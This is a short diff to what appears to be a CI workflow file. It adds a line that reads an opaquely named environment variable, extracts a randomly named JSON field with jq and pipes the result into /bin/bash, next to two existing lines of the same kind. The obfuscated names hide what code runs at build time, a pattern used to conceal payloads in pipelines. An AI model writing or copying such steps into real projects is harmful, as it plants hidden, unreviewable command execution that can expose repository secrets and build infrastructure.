@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$m45" | jq -r .tu08365 | /bin/bash
           echo $gdir11897 | jq -r .tmi8 | /bin/bash
+          echo $ohk695 | jq -r .fhkdx70906 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
